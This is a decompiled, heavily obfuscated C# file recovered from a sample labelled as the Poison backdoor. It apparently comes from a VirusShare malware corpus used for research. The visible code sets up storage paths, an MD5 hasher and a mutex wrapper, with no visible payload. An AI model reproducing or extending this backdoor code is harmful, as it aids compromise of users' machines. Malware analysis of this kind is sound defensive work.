// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 5, Version=0.0.0.0, Culture=neutral, PublicKeyToken=c1ca78561cb11ead
// MVID: 2D47F565-522D-4F7E-99C5-0FAB4FA0B168
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.Poison.eqbg-1d1c34c3e9b902e7445301b77a51949865f13999db65bb166e4f7800abbf116b.exe

using \u0005;
using \u0007;
using \u000F;
using System;
using System.Globalization;
using System.IO;
using System.IO.IsolatedStorage;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace \u0005
{
  internal static class \u0006
  {
    private static readonly string \u0001;
    internal static readonly string \u0002;
    internal static readonly string \u0003;
    internal static readonly string \u0004;
    internal static readonly IsolatedStorageFile \u0001;
    internal static readonly Encoding \u0001;
    internal static readonly HashAlgorithm \u0001;
    [NonSerialized]
    internal static \u0002 \u0098;

    static \u0006()
    {
      try
      {
        if (true)
        {
          \u0003.\u0003.\u0001(typeof (\u0006));
          if (true)
          {
            if (true)
              \u0006.\u0001 = \u008F.\u007E\u0096\u0002((object) \u0006.\u0098(767), 1, 8);
            else
              goto label_6;
          }
        }
        else
          goto label_5;
label_4:
        \u0006.\u0002 = \u0080\u0002.\u0090\u0003(\u0006.\u0001, \u0006.\u0098(4060));
label_5:
        \u0006.\u0003 = \u0080\u0002.\u0090\u0003(\u0006.\u0001, \u0006.\u0098(4077));
label_6:
        \u0006.\u0004 = \u0080\u0002.\u0090\u0003(\u0006.\u0001, \u0006.\u0098(4082));
        \u0006.\u0001 = \u0018.\u0006\u0002();
        do
        {
          \u0006.\u0001 = (HashAlgorithm) new MD5CryptoServiceProvider();
          if (false)
            goto label_4;
        }
        while (false);
        \u0006.\u0001 = \u0002\u0003.\u001B\u0004();
        \u008C\u0002.\u007E\u009E\u0003((object) \u0006.\u0001, \u0006.\u0001);
        \u008C\u0002.\u007E\u009E\u0003((object) \u0006.\u0001, \u0006.\u0003);
      }
      catch (Exception ex)
      {
        \u0004.\u0001(ex);
        throw;
      }
    }

    internal sealed class \u0001 : IDisposable
    {
      private static readonly CultureInfo \u0001;
      private readonly CultureInfo \u0002;
      private readonly Mutex \u0001;
      [NonSerialized]
      internal static \u0002 \u0094;

      public \u0001([In] string obj0)
      {
        try
        {
          this.\u0002 = Thread.CurrentThread.CurrentUICulture;
          Thread.CurrentThread.CurrentUICulture = \u0006.\u0001.\u0001;
          if (obj0.Length > 260)
            obj0 = obj0.Remove(261);
          obj0 = obj0.Replace(Path.DirectorySeparatorChar, '_');
          this.\u0001 = new Mutex(false, obj0);
          try
          {
            this.\u0001.WaitOne();
          }
          catch (AbandonedMutexException ex)
          {
          }
        }
        catch (Exception ex)
        {
          string str = obj0;
          \u0004.\u0001(ex, (object) this, (object) str);
          throw;
        }
      }

      public void \u0001()
      {
        try
        {
          if (true)
          {
            \u0011.\u007E\u0081((object) this.\u0001);
            \u0011.\u007E\u0082((object) this.\u0001);
          }
          \u0004\u0003.\u007E\u001D\u0004((object) \u0003\u0003.\u001C\u0004(), this.\u0002);
        }
        catch (Exception ex)
        {
          \u0004.\u0001(ex, (object) this);
          throw;
        }
      }

      static \u0001()
      {
        try
        {
          Type type = typeof (\u0006.\u0001);
          if (true)
            goto label_2;
label_1:
          \u0006.\u0001.\u0001 = \u0005\u0003.\u001E\u0004(\u0006.\u0001.\u0094(4091));
          return;
label_2:
          \u0003.\u0003.\u0001(type);
          goto label_1;
        }
        catch (Exception ex)
        {
          \u0004.\u0001(ex);
          throw;
        }
      }
    }
  }
}
